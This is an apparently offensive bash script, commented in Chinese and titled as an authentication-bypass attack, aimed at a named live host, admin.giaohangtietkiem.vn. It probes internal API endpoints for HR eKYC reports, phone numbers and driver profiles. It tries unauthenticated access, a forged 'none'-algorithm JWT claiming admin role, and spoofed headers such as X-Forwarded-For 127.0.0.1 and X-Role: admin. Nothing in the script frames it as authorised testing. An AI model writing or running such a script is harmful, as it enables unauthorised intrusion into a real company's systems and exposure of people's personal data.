#!/bin/bash
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 深度攻击1：认证绕过（所有技巧）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

TARGET="admin.giaohangtietkiem.vn"

# 从提取的API列表中测试
API_LIST=(
    "/AdMasterProfile/getDocumentTypes"
    "/AdMasterProfile/getPhoneNumber"
    "/AdHr/getEkycReports"
    "/AdHrTeams/getTeamOption"
    "/address-v2/provinces"
    "/api/tp/list"
    "/api/union/list"
    "/api/rent-driver/count-profile-driver"
)

echo "[*] 测试1：无认证直接访问"
for api in "${API_LIST[@]}"; do
    echo -n "  $api: "
    resp=$(curl -sk "https://$TARGET$api" -m 3 2>&1)
    status=$(echo "$resp" | grep -oE "HTTP/[0-9.]+ [0-9]{3}")
    
    # 检查是否返回数据
    if echo "$resp" | jq . >/dev/null 2>&1; then
        data_len=$(echo "$resp" | jq -r 'if type=="array" then length else . end' 2>/dev/null)
        echo "✅ 返回JSON数据！长度: $data_len"
        echo "$resp" | jq . | head -20
    else
        echo "❌ 需要认证"
    fi
done

echo ""
echo "[*] 测试2：JWT None算法绕过"
# 构造None算法JWT
NONE_JWT="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ."

for api in "${API_LIST[@]}"; do
    echo -n "  $api: "
    resp=$(curl -sk "https://$TARGET$api" -H "Authorization: Bearer $NONE_JWT" -m 3 2>&1)
    echo "$resp" | grep -qE "\[|\{" && echo "⚠️  可能有效！" || echo "❌"
done

echo ""
echo "[*] 测试3：请求头伪造"
HEADERS=(
    "X-Forwarded-For: 127.0.0.1"
    "X-Real-IP: 127.0.0.1"
    "X-Original-URL: /admin"
    "X-Rewrite-URL: /admin"
    "X-Admin: true"
    "X-Role: admin"
)

for header in "${HEADERS[@]}"; do
    echo "  测试头: $header"
    resp=$(curl -sk "https://$TARGET/AdHr/getEkycReports" -H "$header" -m 3 2>&1)
    echo "$resp" | grep -qE "\[|\{" && echo "    ⚠️  可能绕过！"
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
